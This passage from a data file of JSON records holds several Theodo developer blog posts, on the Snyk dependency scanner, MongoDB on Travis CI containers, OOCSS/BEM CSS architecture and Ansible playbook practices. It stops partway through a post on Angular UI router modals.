{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nTrusting your dependencies a bit too much?\nI just attended a great keynote at Velocity 2015 in Amsterdam, by Guy Podjarny (@guypod) and Assaf Hefetz, founders of Snyk.io, a tool in beta which was just unveiled. The keynote highlighted how most developers are blindly trusting third-party open-source dependencies. It also introduced a package and a service making it easy for one to find vulnerabilities, and in some case to fix them.\nAbout 11% of npm dependencies include vulnerabilities, and it often takes a very long time for those to be fixed, if it ever happens. Still think your package is as secure as it gets?\nSnyk\nSnyk is a Node.js CLI package, which can thus be very easily globally installed with\nnpm install -g snyk\r\n\nIt provides a command which will test, using the Snyk API, your Node.js dependencies in a recursive fashion, not only finding your package\u2019s dependencies, but also your package\u2019s dependencies\u2019 dependencies.\nsnyk test\r\n\nIf snyk has nothing on you, snyk won\u2019t be able to help any further. But if not, it also provides another command to fix dependencies by:\n\nUpdating dependencies which now provide fixes for found vulnerabilities.\nAdding patches for those which do not.\nAdding the test command to your testing worflow, with an integration to your CI system.\nAllowing the installation of the patches to your install workflow, on npm\u2019s postinstall step.\nAdding comments for vulnerabilities you do not want to fix for some reasons.\nMonitoring fixes and patches for vulnerabilities which are yet to be fixed.\n\n\nAll those features are available through an interactive prompt using the following command:\nsnyk protect -i\nSounds good?\nSnyk seems like a promising tool, as it automatically detects some security flaws, which are often overlooked when building applications with development speed as the main focus.\nSince it just launched in Beta, I\u2019m guessing Snyk.io\u2018s team is eager to get some feedback.\nYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tWoody Rousseau\r\n  \t\t\t\r\n  \t\t\t\tWoody is a full-stack web developer, who believes in building complex applications, with a focus on speed without compromising code quality. He also loves adding  as many Github badges as possible on his repositories.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nThe new Travis Docker infrastructure\nLate December 2014, Travis announced the implementation of their new infrastructure based on Docker containers in order to improve build capacity, build start time, and resources usage. You can learn more about it on this very detailed article: Faster Builds with Container-Based Infrastructure and Docker\nAs we can read on the Travis documentation about how to use this infrastructure, adding one line only on our .travis.yml is necessary :\n  sudo: false\r\n\nWhy simply not adding this line to my .travis.yml file?\nAs I had to use a specific MongoDB version that I couldn\u2019t choose on the Travis apt-source-white-list, I was forced to install MongoDB as I found on this great article from Maxime Thoonsen and then fated to run my tests on the Travis legacy infrastructure\nbefore_script:\r\n  - sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 7F0CEB10\r\n  - echo 'deb http://downloads-distro.mongodb.org/repo/ubuntu-upstart dist 10gen' | sudo tee /etc/apt/sources.list.d/mongodb.list\r\n  - sudo apt-get update\r\n  - sudo apt-get install -y mongodb-org=2.6.6 mongodb-org-server=2.6.6 mongodb-org-shell=2.6.6 mongodb-org-mongos=2.6.6 mongodb-org-tools=2.6.6\r\n  - sleep 15 #mongo may not respond immediatly\r\n  - mongo --version\r\n\nHow to install it without sudo?\nFirst, as we can find on the Travis documentation, we have to add this line at the beginning of our .travis.yml.\nsudo: false\r\n\r\nservices:\r\n  - docker\r\n  - mongodb\r\n\nThen, we specify the MongoDB version we want to use for our tests.\nenv:\r\n  global:\r\n    - MONGODB_VERSION=2.6.10\r\n\nFinally, we can download the MongoDB archive we want and install it in a specific directory.\n before_install:\r\n  - wget http://fastdl.mongodb.org/linux/mongodb-linux-x86_64-$MONGODB_VERSION.tgz\r\n  - tar xfz mongodb-linux-x86_64-$MONGODB_VERSION.tgz\r\n  - export PATH=`pwd`/mongodb-linux-x86_64-$MONGODB_VERSION/bin:$PATH\r\n  - mkdir -p data/db\r\n  - mongod --dbpath=data/db &\r\n  - sleep 3\r\n\nCongrats, you are done with it !\nIf you want to check if your build has been successfully executed on the container infrastructure, look for the following lines on your Travis build logs.\n\nThe directs improvements we have seen\nFirst, as advertised by Travis, our builds that sometimes needed several minutes to start, now systematically start within less than 10 seconds.\nSecondly, the build speed itself has also increased sharply as you can see on the samples above.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tThibaut Cheymol\r\n  \t\t\t\r\n  \t\t\t\tThibaut is a full-stack web developer. Passionate about Javascript, he has a preference for ReactJs  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tCSS coding should not be a pain in the neck. At some point, most developers notice that they avoid writing CSS and that it has an impact on their efficiency and on the code quality, which is unacceptable.\nIt recently happened to me so I decided to tackle this issue. I stopped, took a deep breath and I dived, crawling the Internet looking for a solution.\nI eventually found one, and I never despised CSS ever since.\nIn fact, I rewrote the entire CSS stylesheet of my main personal project (its design is entirely custom) and I achieved a 50% drop in CSS lines count and number of classes, in addition to increasing maintainability, reusability and code quality.\nIn this article, I will cover these subjects:\n\nWhy CSS is important\nHow to avoid common mistakes\nHow to structure your code with the OOCSS and BEM methodologies\nWhich best practices I used and I recommend\n\nThis article will serve you well if you code your CSS from scratch but it will also help you if you use frameworks like Bootstrap (let\u2019s face it, you can not do everything with a styling framework). I assume that you are using a preprocessor so the LESS syntax will be used in the examples.\nWhy you should care about CSS\nCSS with preprocessors like LESS and SASS is a great tool. But remember: \u201cWith great power comes great responsibility\u201d. Having powerful tools like design patterns and awesome frameworks does not mean you will use them without running into trouble. Doing bad, bad, bad things is super easy with CSS and preprocessors. Even if you say \u201cok, this time I will do it better\u201d, if you do not have some quality standards you will keep writing messy CSS. Let\u2019s see why:\n\nLike any language, CSS should be reusable, maintainable and scalable. Adding CSS properties on top of each other in order to fix a problem will break these three rules.\nEver seen plentiful padding/margin/color declarations in every CSS class? You know what I\u2019m talking about. Code should not be duplicated.\nEver used !important because you needed it to fix a previously applied CSS rule? You know it\u2019s wrong. Why are you still doing it? Fix the problem at the source.\nKeeping your specificity low (we\u2019ll talk about it later) will speed up CSS rendering and maintainability.\n\nDealing with selectors\nFirst of all, you must have a good understanding of what specificity is. Here is a nice definition :\nSpecificity determines which CSS rule is applied by the browsers. If two selectors apply to the same element, the one with higher specificity wins.\nThe rules to win the specificity war are:\n\nInline style beats ID selectors. ID selectors are more specific than classes and attributes (::hover, ::before\u2026). Classes win over element selectors.\nA more specific selector beats any number of less specific selectors. For instance, .list is more specific than div ul li.\nIncreasing the number of selectors will result in higher specificity (.list.link is more specific than .list).\nIf two selectors have the same specificity, the latest declared rule wins.\n!important overrides normal declarations, duplicating all specificity levels, leading to eight categories in the selectors hierarchy.\n\nHere is a good website to compute the specificity of a selector: Specificity Calculator. Try it with your own selectors! Now that we fully understand specificity, here are some best practices:\nHave decoupled selectors\nSeparating your selectors is a good idea. For instance, if you have this markup:\n<div class=\"alert danger\">...</div>\r\n\nYou should style it with:\n/* GOOD */\r\n.alert {\r\n    font-weight: bold;\r\n}\r\n.danger {\r\n    color: red;\r\n}\r\n/* BAD */\r\n.alert.danger {\r\n    font-weight: bold;\r\n    color: red;\r\n}\r\n\nDecoupling selector will not only increase maintainability and scalability: it will speed up the rendering. Most web browsers are caching first-level selectors. .alert and .danger will be cached but not .alert.danger!\nKeep your specificity low\nIn short, avoid downward selection like hell. With a sufficient amount of CSS, you would end up using inline styles. For instance, this is a very bad selector:\n#hellobar a.hellobar_cta.hb-button {}\r\n\nIn addition to the non-meaningful class names, how would you overwrite a rule set by this selector? Using !important, inline style or just another class, maybe?\nTo avoid future complication and refrain your inclination to go down in the specificity hell, you should follow these rules:\n\nUse only classes. If you limit yourself to classes you will never dig that deep. The first thing that you learn in CSS is: \u201cnever do inline style\u201d. Same here.\nNever use !important to go downward. The only correct way to use !important is to ensure upward specificity. Here is a good example: danger should always be red, no matter what happens.\n\n.danger { color: red !important; }\r\n\nDon\u2019t mess with HTML or Javascript\nEvery language exists for a reason and is an autonomous, meaningful entity.\nCSS is for styling. HTML is for meaning. Javascript is for manipulation.\n\nNever style IDs. It is too specific and impossible to reuse. IDs should only be used as anchors or as Javascript selectors.\nOn the contrary, you should never use classes as Javascript selectors, because that would mean that you couldn\u2019t reuse a CSS class. Use IDs or data-attributes instead.\nNever style HTML elements. For me, that was the hardest part of the learning curve because it went against everything I had done before. HTML should be meaningful: using a DOM element for styling is a bad practice. Imagine you had a .clickable class which displays a specific color and a custom pointer on hover. You could apply it like this:\n\n<a class=\"clickable\"></a>\r\n<li class=\"clickable\"></li>\r\n<tr class=\"clickable\"></tr>\r\n<h3 class=\"clickable\"></h3>\r\n\nThis is particularly useful for single page apps using custom routing links or for a resource that is accessible on click, without page change. If you have a user input (like a text coming from a WYSIWYG textarea), consider making an exception:\n.user-input {\r\n    a { .clickable; }\r\n    h1 { .big; }\r\n    kbd { .code; }\r\n}\r\n\nIt is also a good practice to write style-first DOM. Provided you have a nice grid system (flexbox is great), you might consider ordering your properties like this:\n\nGrid-related attributes.\nClasses (with two white spaces between each class for better readability).\nHTML attributes.\nOther custom attributes.\n\nFor instance, if I have an AngularJS app:\n<a flex=\"50\" class=\"btn  btn-default\" href=\"...\" title=\"...\" ng-if=\"...\"></a>\r\n\nThe first step to heaven: OOCSS\nIf there is one word to describe OOCSS, it is reusability. What is OOCSS?\nOOCSS means Object-Oriented CSS. The goal is to find repeated visual patterns and to factorize them when possible. .big-title is better than .main-title while .links-list is prefered to .articles-menu.\nBootstrap was the first great impulsion towards OOCSS. See for yourself:\n<a class=\"btn  btn-default  btn-lg\"></a>\r\n\nSome properties are factorized in the .btn class, reducing code size and speeding up rendering.\nBut OOCSS have some downsides: sometimes the need is too specific, you can\u2019t address with factorized objects. For instance, building a monolithic web app with an original design is merely impossible with OOCSS only.\nFurthermore, it is very difficult to foresee what piece of code will be reused because OOCSS relies on visual patterns and you don\u2019t have any when starting a web app from scratch.\nThe BEM structure\nBEM is a method published in 2010 by Yandex. It means Block Element Modifier. It relies on the fact that every web page or web app can be exploded into blocks, elements and modifiers.\nThe BEM syntax is a bit specific. The official naming convention is:\n.block {}\r\n.block--modifier {}\r\n.block__element {}\r\n.block__element--modifier {}\r\n\nHere is a short example which sums up the entire BEM concept:\n.Person {}\r\n.Person--blind {}\r\n.Person__head {}\r\n.Person__hand {}\r\n.Person__hand--left {}\r\n.Person__hand--right {}\r\n\n(I like to start class names with a capital letter because it ensures that the name is not already in use by a vendor like Bootstrap)\nBEM Blocks\nA block is an autonomous entity, a component of the web app. An app can be represented as as Block Tree. For instance, here is an excerpt from the official BEM website:\n\nA block can even be reused across websites and most of all it has its own context. Which means that higher or lower blocks in the Block Tree will not affect the display of the current block.\nTo achieve this, positioning rules and BEM blocks should be totally decoupled. A Block class should not contain rules such as float, margin or width.\nThe main advantage of this is that blocks can be moved across the website without worry. An interesting property is that, as a consequence, blocks can be included recursively. Imagine building a Reddit-like comment tree:\n<div class=\"CommentBox\">\r\n    [... Text ...]\r\n    <div class=\"CommentBox\">\r\n        [... Text ...]\r\n        <div class=\"CommentBox\">\r\n            [... Text ...]\r\n        </div>\r\n    </div>\r\n    <div class=\"CommentBox\">\r\n        [... Text ...]\r\n    </div>\r\n</div>\r\n\nIf blocks and positioning rules are properly decoupled, you win!\nThis is particularly powerful when used in combination with components-based frameworks: AngularJS directives, ReactJS components\u2026\nBEM Elements and Modifiers\nAn element is a part of a block. Thus it uses the block context. That\u2019s why there is a reminder before the element name:\n.block__element {}\r\n\nBlocks being autonomous entities, elements can and should be positioned inside them. Modifiers are classes used to propose alternative versions of a block or an element. The following example could be described by this markup:\n<nav class=\"Navbar\">\r\n    <a class=\"Navbar__tab\">Tab 1</a>\r\n    <a class=\"Navbar__tab\">Tab 2</a>\r\n    <a class=\"Navbar__tab  Navbar__tab--active\">Tab 3</a>\r\n    <a class=\"Navbar__tab\">Tab 4</a>\r\n</nav>\r\n\n\nPreprocessors are really useful:\n.Navbar {\r\n    ... rules ....\r\n\r\n    &__tab {\r\n        ... rules ....\r\n\r\n        &--active {\r\n            ... rules ....\r\n        }\r\n    }\r\n}\r\n\nElements can also be positioned blocks:\n<div class=\"Search\">\r\n    <input class=\"Search__input  Input\">\r\n    <button class=\"Search__button  Button\"></button>\r\n</div>\r\n\nSuggested CSS architecture\nNow that you have all of this in mind, how to structure your CSS (or LESS/SASS files)? There is no absolute guideline but here is a suggested file tree:\nstyle\r\n\u251c\u2500\u2500 bootstrap.less\r\n\u251c\u2500\u2500 components\r\n\u2502   \u251c\u2500\u2500 button.less\r\n\u2502   \u251c\u2500\u2500 link.less\r\n\u2502   \u251c\u2500\u2500 navbar.less\r\n\u2502   \u2514\u2500\u2500 ...\r\n\u251c\u2500\u2500 objects\r\n\u2502   \u251c\u2500\u2500 colors.less\r\n\u2502   \u251c\u2500\u2500 grid.less\r\n\u2502   \u251c\u2500\u2500 typo.less\r\n\u2502   \u2514\u2500\u2500 ...\r\n\u251c\u2500\u2500 resets\r\n\u2502   \u251c\u2500\u2500 fonts.less\r\n\u2502   \u251c\u2500\u2500 html.less\r\n\u2502   \u251c\u2500\u2500 vendor.less\r\n\u2502   \u2514\u2500\u2500 ...\r\n\u2514\u2500\u2500 themes\r\n    \u251c\u2500\u2500 theme1.less\r\n    \u251c\u2500\u2500 theme2.less\r\n    \u2514\u2500\u2500 ...\r\n\n\nIf you consider theming (theme files defining colors then including the bootstrap file), your favorite build system could build all files in the themes folder into separate minified CSS files. If theming is not important, you can delete this folder and directly build the bootstrap file.\nThe bootstrap file should load the resets then the objects then the components.\nReset files are here to wipe out unwanted styling such as text-decoration on links, title margins or vendor classes.\nObjects are OOCSS classes and mixins reusable everywhere: .small, .big, .padded\u2026 with this you could unify all your padding values, your font sizes etc.\nComponents are entire BEM contexts: blocks with their elements and modifiers.\n\nWith this you could easily reuse bits of code and components for your other websites. Creating your own styling framework is at a hand and it is not that difficult!\nConclusion\nWith OOCSS and BEM, I began to enjoy CSS. Before, it was more a drudgery than anything else.\nWith OOCSS and BEM, the code is more structured, reusable, and you have that feeling that you\u2019re doing it right. Which is in my opinion the most important thing because you will be more efficient and produce better quality code.\nSources and inspirations:\n\nThis excellent and striking presentation tackling our styling methods\nAn article on CSS specificity\nThe official BEM documentation\nMaterial Design Lite, if you want to check out an implementation of BEM\n\n\nYou liked this article? You\u2019d probably be a good match for our ever-growing tech team at Theodo. Take a look at our job offers on http://www.theodo.fr/en/joinus/.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlb\u00e9ric Trancart\r\n  \t\t\t\r\n  \t\t\t\tAlb\u00e9ric Trancart is an agile web developer at Theodo. He loves sharing what he has learnt and exchanging with great people.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI have been building playbooks for two years and I always try to make them understandable. However, one of our playbooks in a big project became very complex and is now very hard to understand and to maintain. I didn\u2019t want to make that mistake again so I made a list with my personal good practices to prevent building complex playbook that I share with you here.\nTL;DR: If you don\u2019t want to build unintelligible playbooks that will cost you a lot in the long run, you should read my following suggestions.\n[Edit]: I\u2019m writting a book about Ansible, click here if want a free draft.\nMake it simple\nI am a web developer not an OPS. I build Node.js/AngularJs and Symfony applications. I remember my first times doing some provisioning, it was running with Puppet. It was brilliant but also very complex. I had a really hard time understanding how it worked and debugging it wasn\u2019t the funniest part in my life. I hated working with provisioning at that time. I still make those nightmares about it\u2026\nI was then introduced to Ansible and I completely changed my mind about provisioning \\o/. Now I love it. And I want beginners to feel the same as I do. Therefore I really focus on making my playbooks truly simple so they can be understandable by everyone. So if you also believe that automated provisioning should be applied by everyone, then think about beginners when you write your code and make everything simple. Everybody should be able to use your playbooks.\n\n(Thanks Justin Nemmers for the picture !)\nMost of the time my playbooks are used to provision servers running a webapp and since I always run them on fewer than 5 servers at a time, I don\u2019t try to make them quick (to execute), speed is not a big deal for me. But I guess execution time is an important factor when you have to run your playbook on thousands of servers.\nTherefore, I think that my best practices fit only for people who use Ansible in the same way as I do.\nAvoid using tags\n\nI often read that we should tag everything, but I disagree.\nTL;DR: It can be OK to tag a role in a playbook, but no one should use tag inside a role.\nWhy do tags exist in Ansible ? Let\u2019s see what the Ansible documentation says:\nIf you have a large playbook it may become useful to be able to run a specific part of the configuration without running the whole playbook.\nBoth plays and tasks support a \u201ctags:\u201d attribute for this reason.\nThere are ways to avoid tags\nI use Ansible to provision my servers or to udpdate a configuration on some servers. Playbooks have to be idempotent and it\u2019s better to check idempotency at each execution. So the only reason why I could be using tags is to gain execution time.\nBut as I said earlier, time is not a big deal for me. Therefore I have no interest in using them.\nIf you are building your playbook and you want to run only some roles to gain time, just comment the unnecessary roles in the playbook. You don\u2019t need tags for that.\nSometimes, you may have to perform a specific action. Like during the \u201cheartbleed crisis\u201d, you had to update your bash on almost every server. But even in this kind of situation, you don\u2019t use tags, you use a specific new playbook.\nWhen you run a playbook using tags you are often targeting specifics roles like the example from the Ansible documentation\n- name: be sure ntp is installed\r\n  yum: pkg=ntp state=installed\r\n  tags: ntp\r\n\r\n- name: be sure ntp is configured\r\n  template: src=ntp.conf.j2 dest=/etc/ntp.conf\r\n  notify:\r\n    - restart ntpd\r\n  tags: ntp\r\n\r\n- name: be sure ntpd is running and enabled\r\n  service: name=ntpd state=running enabled=yes\r\n  tags: ntp\r\n\nIn this case I\u2019d rather have a playbook \u201cntp\u201d that run only the ntp role than using the tags.\nWhich one of the following commands tells us the most clearly what is going to happen ?\nansible-playbook playbook.yml -i hosts/production --tags=\"ntp\"\r\n\nor\nansible-playbook ensure-ntp-is-working.yml -i hosts/production\r\n\nThe first one is talking about ntp. But we don\u2019t know the purpose of running this command. With the second one we know that it is to ensure that ntp is working.\nThink about beginners ! Make their life easier, don\u2019t use tags.\n\nTags come from the dark side\nSo tags are not useful. But there is worse. They are harmful to your playbook because they add complexity. When you add a tag, this tag is here for a purpose. Therefore, every time they see a tag in your playbook, people have to understand the purpose of it. As a result, your playbook is becoming more difficult to understand and to maintain.\nHere is a part of one of our nginx\u2019s role.\n- name: add repo file\r\n  template: src=nginx.repo dest=/etc/yum.repos.d/nginx.repo mode=644 owner={{ app_user }}\r\n  tags:\r\n  - nginx\r\n  - packages\r\n\r\n- name: install\r\n  yum: name=nginx enablerepo=nginx state=latest\r\n  tags:\r\n  - nginx\r\n  - packages\r\n  - yum\r\n\r\n- name: create working directories\r\n  file: path={{ item }} state=directory mode=755 owner={{ app_user }}\r\n  with_items:\r\n    - \"{{ etc_path }}/nginx\"\r\n    - \"{{ etc_path }}/nginx/conf.d\"\r\n    - \"{{ log_path }}/nginx\"\r\n    - \"{{ tmp_path }}/nginx\"\r\n  tags:\r\n  - nginx\r\n  - filesystem\r\n\r\n- name: remove nginx conf file\r\n  file: path=/etc/nginx/nginx.conf state=absent\r\n  tags:\r\n  - nginx\r\n  - yum-cleaning\r\n\r\n- name: disable service as sudo_user\r\n  service: name=nginx enabled=no\r\n  tags:\r\n  - nginx\r\n  - services\r\n  - yum-cleaning\r\n\nThere are six different tags (nginx, packages, yum, filesystem, yum-cleaning, service) making at least 6 ways of using the role. If you want to test your playbooks (and you should), you will have to test every combination that your tags permit instead of one single run without tags. It\u2019s already hard to test the playbooks because they depend on the Ansible version and the OS version. If you add tags, it becomes really annoying.\nIn this role, if we want to test every possible combination, we will have to test 2^6 = 64 combinations !\n\nThe same part of the role without the tags is pretty simple. We know that every task will be run anytime without any condition or specific purpose to understand.\n- name: add repo file\r\n  template: src=nginx.repo dest=/etc/yum.repos.d/nginx.repo mode=644 owner={{ app_user }}\r\n\r\n- name: install\r\n  yum: name=nginx enablerepo=nginx\r\n\r\n- name: create working directories\r\n  file: path={{ item }} state=directory mode=755 owner={{ app_user }}\r\n  with_items:\r\n  - \"{{ etc_path }}/nginx\"\r\n  - \"{{ etc_path }}/nginx/conf.d\"\r\n  - \"{{ log_path }}/nginx\"\r\n  - \"{{ tmp_path }}/nginx\"\r\n\r\n- name: remove nginx conf file\r\n  file: path=/etc/nginx/nginx.conf state=absent\r\n\r\n- name: disable service as sudo_user\r\n  service: name=nginx enabled=no\r\n\nIt\u2019s nearly impossible to remember all the tasks of your playbook that have a particular tag. So it\u2019s never crystal clear what your are doing when you run your playbooks using tags.\n\nOne role, one goal\nAvoid tasks within a role that are not related to each others. Don\u2019t build \u201ccommon role\u201c. It\u2019s ugly and it\u2019s bad for the readability of your playbook.\n\nInstead try to make more little roles with explicit names.\nSee this playbook:\n- name: My playbook\r\n  hosts: all\r\n  sudo: true\r\n  vars_files:\r\n    - vars/main.yml\r\n\r\n  roles:\r\n    - common #What the hell does this role do?\r\n    - Stouts.nodejs\r\n    - Stouts.mongodb\r\n\nAnd this one:\n- name: My playbook\r\n  hosts: all\r\n  sudo: true\r\n  vars_files:\r\n    - vars/main.yml\r\n\r\n  roles:\r\n    - ubuntu-apt\r\n    - create-www-data-user\r\n    - Stouts.nodejs\r\n    - Stouts.mongodb\r\n\nThe last one is easier to understand.\nConvention on naming your role.\nI really like roles that can be run on many OSs and for many kinds of application. I try to make my roles as generic as I can. But, if in order to work on many OSs or for many applications, the role becomes too complex, then I prefer using a more specific but simpler role.\n\nIf your role works only on some OSs or for a specific kind of application, you should explicitly say so in the role\u2019s name. By making so, just by reading the role\u2019s name we know how specific it is.\nWe often find the name of the author in the name of a role but having it doesn\u2019t help us a lot to understand how a role works. So I think it shouldn\u2019t be in the role\u2019s name.\nTaking into account what I just said, my convention on how to name a role is OS-Application-Purpose.\nA few examples:\n\u2013 debian-symfony-nginx: I can quickly understand that this role provision nginx for Symfony\u2019s applications on every OS of the Debian\u2019s family.\n\u2013 ubuntu-mongodb: The role will install and configure MongoDB on Ubuntu.\n\u2013 nodejs: Here the role will install Node.js on every kind of OS.\nMake explicit the dependencies of a playbook\nA playbook should be read like a great story in a book. You read the roles from top to bottom and you understand everything that is going on with the playbook, period.\n\nIf you want to quickly understand what a playbook does which solution do you prefer?\n- name: My playbook with dependencies\r\n  hosts: all\r\n  sudo: true\r\n  vars_files:\r\n    - vars/main.yml\r\n\r\n  roles:\r\n    - elasticsearch\r\n    - drupal\r\n\nor\n- name: My playbook without dependencies\r\n  hosts: all\r\n  sudo: true\r\n  vars_files:\r\n    - vars/main.yml\r\n\r\n  roles:\r\n    - java\r\n    - elasticsearch\r\n    - git\r\n    - apache\r\n    - mysql\r\n    - php\r\n    - php-mysql\r\n    - composer\r\n    - drush\r\n\nWhen you read the second one, you see every roles involved in the playbook and you don\u2019t have to dig to get the information.\nOne server, one run to provision it the first time\nYou can have many playbooks to manage your server in your daily operations like the ensure-ntp-is-working.yml playbook.\nBut you should be able to provision it the first time with only one playbook.\nYou shouldn\u2019t do something like this:\nansible-playbook -i hosts/myserver playbook_part1.yml\r\nansible-playbook -i hosts/myserver playbook_part2.yml\r\nansible-playbook -i hosts/myserver playbook_part3.yml\r\n\nInstead, you should be able to provision your server with:\nansible-playbook -i hosts/myserver playbook.yml\r\n\n\nIf you have more than one playbook, in most of the time you will have to remember the order in which you have to run them. Testing and checking idempotency are also more pratical having one playbook instead of many.\nExplore Ansible Galaxy\nThere are many great roles over there. Instead of rewriting everything go forking! Look at how other people do, you will learn faster.\nDon\u2019t use requirements.txt\nWhen you type ansible-galaxy install -r requirements.txt, it uses the tag of the Github repository to git clone it. A git tag doesn\u2019t set a version of the code. The code behind a tag can be updated. So you can\u2019t know for sure what you will end up downloading by this way. And this is bad for many reasons including security.\n\nInstead use GIT and add the roles as submodules. It allows you to update the roles while being confident about the version of the code you download.\nPut the community\u2019s roles in a separate folder\nIf you want to be able to update the roles you found on ansible-galaxy or directly on Github you should put it in a separate folder so you can quickly find your roles (that you can change) and the community role (that you shouldn\u2019t change).\u00a0You will end with something like:\n\r\n\u251c\u2500\u2500 group_vars\r\n\u251c\u2500\u2500 hosts\r\n\u251c\u2500\u2500 roles\r\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 community\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 composer\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 ubuntu-apt\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 ubuntu-mysql\r\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500 ubuntu-symfony-nginx\r\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 my_app-monitoring\r\n\u2502\u00a0\u00a0 \u2514\u2500 ubuntu-rabbitmq\r\n\u251c\u2500\u2500 vars\r\n\u2514\u2500 playbook.yml\r\n\nIf you really want to make a change to a community role, you have two options:\n\u2013 You make a pull-request for this change.\n\u2013 You make the change and you move the role in the directory with your own roles.\nIf you choose to separate your roles, you have to tell Ansible where it can find them with the ansible.cfg file like for example:\n\r\n[defaults]\r\nroles_path = devops/provisioning/roles/community\r\ninventory = devops/provisioning/hosts\r\n\nDon\u2019t use \u2018vagrant provision\u2019\nIf you are a Vagrant user, you may be using the ansible provisioner. I know that the command is very convenient but it will confuse beginners a lot because there are differents concepts involved:\n\u2013 Creating the VM (Virtualbox)\n\u2013 Configuring the VM (Vagrant)\n\u2013 Provisioning the VM (Ansible)\nIt\u2019s already not easy to understand each role of Virtualbox and Vagrant during the creation of the VM. If you mix it with the role of Ansible, you are not helping\u2026\n\nAnd honestly, you won\u2019t lose so much time using\nansible-playbook playbook.yml -i hosts/vagrant\r\n\ninstead of\nvagrant provision\r\n\nAt Theodo, we use OpenStack to create VMs for our staging environment. There is also plugin to create OpenStack\u2019s VM from the Vagrantfile. Same story here, don\u2019t use this plugin because it\u2019s highly confusing.\nOne day one brillant trainee spent almost the whole day trying to create and provision one OpenStack VM via the Vagrantfile. Because we were doing vagrant up and vagrant provision for the dev environment, he wanted to do the same for the staging one to have consistency.\n\nKeep it light\nThis is the same as any other part of your code: you should delete every file and directory that is not mandatory.\n\nCheck out our open source projects\nWe have a small open source organization on Github, have a look at out our website. Our goal is to provide simple-to-use tools to make the provisioning with Ansible easier and easier. By doing this, we hope that we will help a lot of people learning and enjoying Ansible. If you like the spirit of this organization, we are looking for people to help us.Just make a nice PR and you will be welcome! =).\n\nOther great tips\nI really liked this article about \u201cAnsible (Real Life) Good Practices\u201c.\nYou will find other opinions about tags\u2026 ;).\nIt will explain why you should:\n\u2013 Use a module when available\n\u2013 Set a default for every variable\n\u2013 Use the \u2018state\u2019 parameter\n\u2013 Prefer scalar variables\n\u2013 Tag every task and role\nYou can find some other tips here like \u201cBeware of default\u201d in these slides.\nThanks for reading, if you want to share your bests tips with us, they are very welcome! The fastest way is to ping me on Twitter.\nIf you need help to build a nice Agile/Devops working environment, we will love helping you!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tStateful modals with Angular UI router\nModals are very useful to capture user focus, thus enhancing user experience.\nTheir use was largely popularized by Twitter Bootstrap and now by its Angular-equivalent: Angular UI Bootstrap.\nThis article assumes you are familiar with the Angular UI router and Angular. Code samples are written in Coffeescript and Jade.\nCreating a modal with UI Bootstrap\nFirst you need to set up the action trigger. In our case, we\u2019ll use a simple button.\n# home/states/main/view.jade (View from which the modal is launched)\r\n//...\r\nbutton.btn.btn-default(ng-click=\"launchModal()\")\r\n//...\r\n\nlaunchModal is called by the ng-click directive and triggers the modal. If you need to pass arguments to your modal, you can add a resolve attribute, as shown below.\n# home/states/main/controller.coffee  (Controller of the view from which the modal is launched)\r\nangular.module 'home-module'\r\n  .controller 'HomeController', ($scope) ->\r\n    $scope.foo = 'bar'\r\n    $scope.launchModal = ->\r\n      modalInstance = $modal.open\r\n        animation: true\r\n        templateUrl: 'home/modals/mymodal/view.html'\r\n        size: 'lg'\r\n        controller: 'MyModalCtrl'\r\n        resolve:\r\n          myVar: ->\r\n            $scope.foo\r\n\r\n      modalInstance.result.then (anotherVar) ->\r\n        $scope.anotherVar = anotherVar\r\n\nNotice myVar is then available in the Modal controller by adding it as a dependency.\n# home/modals/mymodal/controller.coffee (Modal controller)\r\nangular.module 'home-module'\r\n  .controller 'MyModalCtrl', 